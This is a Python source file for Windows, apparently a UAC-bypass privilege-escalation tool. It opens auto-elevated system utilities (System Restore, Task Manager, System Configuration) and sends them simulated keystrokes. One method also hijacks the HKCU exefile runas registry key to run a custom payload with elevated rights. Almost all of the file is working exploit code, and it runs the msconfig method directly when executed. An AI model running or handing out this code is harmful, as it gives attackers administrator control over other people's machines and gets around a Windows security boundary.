import ctypes
import _winreg
import time
import sys
import os

class ShellExecInfo(ctypes.Structure):
	_fields_ = [("cbSize", 	 ctypes.c_uint32),
		("fMask",	 ctypes.c_ulong),
		("hwnd",	 ctypes.c_void_p),
		("lpVerb",	 ctypes.c_wchar_p),
		("lpFile",	 ctypes.c_wchar_p),
		("lpParameters", ctypes.c_wchar_p),
		("lpDirectory",  ctypes.c_wchar_p),
		("nShow", 	 ctypes.c_int),
		("hInstApp", 	 ctypes.c_void_p),
		("lpIDList", 	 ctypes.c_void_p),
		("lpClass", 	 ctypes.c_wchar_p),
		("hKeyClass", 	 ctypes.c_void_p),
		("dwHotKey", 	 ctypes.c_uint32),
		("hIcon", 	 ctypes.c_void_p),
		("hProcess", 	 ctypes.c_void_p)]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", 	 ctypes.c_void_p),
		("hThread", 	 ctypes.c_void_p),
		("dwProcessId",  ctypes.c_ulong),
		("dwThreadId", 	 ctypes.c_ulong)]


class disable_fsr():
	disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
	revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

	def __enter__(self):
		self.old_value = ctypes.c_long()
		self.success = self.disable(ctypes.byref(self.old_value))

	def __exit__(self, type, value, traceback):
		if self.success:
			self.revert(self.old_value)


class registry():
	def __init__(self):
		self.hkeys = {
			'hkcu': _winreg.HKEY_CURRENT_USER,
			'hklm': _winreg.HKEY_LOCAL_MACHINE
		}

	def modify_key(self, hkey, path, name, value, create=False):
		try:
			if not create:
				key = _winreg.OpenKey(self.hkeys[hkey], path, 0, _winreg.KEY_ALL_ACCESS)
			else:
				key = _winreg.CreateKey(self.hkeys[hkey], os.path.join(path))
				_winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, value)
				_winreg.CloseKey(key)
			return True
		except Exception as e:
			return False

	def remove_key(self, hkey, path, name='', delete_key=False):
		try:
			if delete_key:
				_winreg.DeleteKey(self.hkeys[hkey], path)
			else:
				key = _winreg.OpenKey(self.hkeys[hkey], path, 0, _winreg.KEY_ALL_ACCESS)
				_winreg.DeleteValue(key, name)
				_winreg.CloseKey(key)
			return True
		except Exception as e:
			print e
			return False

	def query_value(self, hkey, path, name):
		try:
			key = _winreg.OpenKey(self.hkeys[hkey], path, 0, _winreg.KEY_READ)
			value = _winreg.QueryValueEx(key, name)
			_winreg.CloseKey(key)
		except WindowsError:
			return None
		else:
			return value[0]


class uihack():
	def __init__(self):
		self.VK_SPACE 	= 0x20
		self.VK_RETURN 	= 0x0D	
		self.VK_RIGHT	= 0x27
		self.VK_LEFT 	= 0x25
		self.VK_DOWN 	= 0x28
		self.VK_MENU 	= 0x12
		self.VK_UP 	= 0x26
		self.VK_TAB	= 0x09
		self.VK_F10	= 0x79
		self.VK_C	= 0x43
		self.VK_M	= 0x4D
		self.VK_D	= 0x44

	def keybd_event(self, keycode):
		if ctypes.windll.user32.keybd_event(keycode,0,0,0):
			time.sleep(0.1)
			if ctypes.windll.user32.keybd_event(keycode,0,0x0002,0):
				return True
			else:
				return False
		return False

	def host_process(self, process, params):
		shinfo = ShellExecInfo()
		shinfo.cbSize = ctypes.sizeof(shinfo)
		shinfo.fMask = 0x00000040
		shinfo.lpFile = process
		shinfo.nShow = 5
		shinfo.lpParameters = params

		with disable_fsr():
			try:
				return bool(ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(shinfo)))
			except Exception as error:
				return False

	def rstrui(self, payload):
		#
		# This method supports custom payloads
		#
		if uihack().host_process("rstrui.exe", "/RUNONCE"):
			time.sleep(5)

			if registry().modify_key("hkcu", "Software\\Classes\\exefile\\shell\\runas\\command", None, payload, create=True):
				print "[Debug] Registry key created"
			else:
				print "[Debug] Unable to create registry key"
				return False

			print "[Debug] Attempting to locate window 'System Restore' using FindWindowA"
			hwnd = ctypes.windll.user32.FindWindowA(None, "System Restore")
			if hwnd:
				print "[Debug] FindWindowA - HWND:  {hwnd}".format(hwnd=hwnd)
				if ctypes.windll.user32.SetForegroundWindow(hwnd):
					print "[Debug] SetForegroundWindow - HWND:  {hwnd}".format(hwnd=hwnd)
					if uihack().keybd_event(self.VK_LEFT):
							print "[Debug] keybd_event Press - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
							time.sleep(0.1)
					if uihack().keybd_event(self.VK_RETURN):
							print "[Debug] keybd_event Press - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
							time.sleep(0.1)								
				else:
					print "[Debug] Unable to set window to foreground, cannot proceed"
					return False							
			else:
				print "[Debug] Unable to locate window, cannot proceed"
				return False

			if registry().remove_key("hkcu", "Software\\Classes\\exefile\\shell\\runas\\command", None, delete_key=False):
				print "[Debug] Registry key restored"
			else:
				print "[Debug] Unable to restore registry key"
				return False
		else:
			print "[Debug] Unable to start host process, cannot proceed"
			return False

	def taskmgr(self):
		#
		# This method can spawn an visible elevated command prompt, no
		# custom payloads supported unless you execute them via the elevated
		# command prompt that pops up upon successful exploitation.
		#
		if uihack().host_process("taskmgr.exe", None):
			time.sleep(5)

			print "[Debug] Attempting to locate window 'Task Manager' using FindWindowA"
			hwnd = ctypes.windll.user32.FindWindowA(None, "Task Manager")
			if hwnd:
				print "[Debug] FindWindowA - HWND:  {hwnd}".format(hwnd=hwnd)
				if ctypes.windll.user32.SetForegroundWindow(hwnd):
					print "[Debug] SetForegroundWindow - HWND:  {hwnd}".format(hwnd=hwnd)

					if uihack().keybd_event(self.VK_MENU):
						print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_MENU)
						time.sleep(0.1)
					if uihack().keybd_event(self.VK_RETURN):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
						time.sleep(0.1)
					if uihack().keybd_event(self.VK_RETURN):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
						time.sleep(0.1)

					if uihack().keybd_event(self.VK_C):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_C)
						time.sleep(0.1)
					if uihack().keybd_event(self.VK_M):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_M)
						time.sleep(0.1)				
					if uihack().keybd_event(self.VK_D):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_D)
						time.sleep(0.1)

					if uihack().keybd_event(self.VK_TAB):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_TAB)
						time.sleep(0.1)
					if uihack().keybd_event(self.VK_SPACE):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_SPACE)
						time.sleep(0.1)
					if uihack().keybd_event(self.VK_RETURN):
						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
						time.sleep(0.1)				
				else:
					print "[Debug] Unable to set window to foreground, cannot proceed"
					return False
			else:
				print "[Debug] Unable to locate window, cannot proceed"
				return False
		else:
			print "[Debug] Unable to start host process, cannot proceed"
			return False

	def msconfig(self):
		#
		# This method can spawn an visible elevated command prompt, no
		# custom payloads supported unless you execute them via the elevated
		# command prompt that pops up upon successful exploitation.
		#
		if uihack().host_process("msconfig.exe", "-7"):
			time.sleep(5)

			print "[Debug] Attempting to locate window 'System Configuration' using FindWindowA"
			hwnd = ctypes.windll.user32.FindWindowA(None, "System Configuration")
			if hwnd:
				print "[Debug] FindWindowA - HWND:  {hwnd}".format(hwnd=hwnd)
				if ctypes.windll.user32.SetForegroundWindow(hwnd):
					print "[Debug] SetForegroundWindow - HWND:  {hwnd}".format(hwnd=hwnd)
					for x in range(14):
						if uihack().keybd_event(self.VK_DOWN):
							print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
							time.sleep(0.1)

					for x in range(2):
						if uihack().keybd_event(self.VK_TAB):
							print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_TAB)
							time.sleep(0.1)

					if uihack().keybd_event(self.VK_RETURN):
						print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
				else:
					print "[Debug] Unable to set window to foreground, cannot proceed"
					return False
			else:
				print "[Debug] Unable to locate window, cannot proceed"
				return False
		else:
			print "[Debug] Unable to start host process, cannot proceed"
			return False

#uihack().rstrui("c:\\windows\\system32\\cmd.exe")
#uihack().taskmgr()
uihack().msconfig()
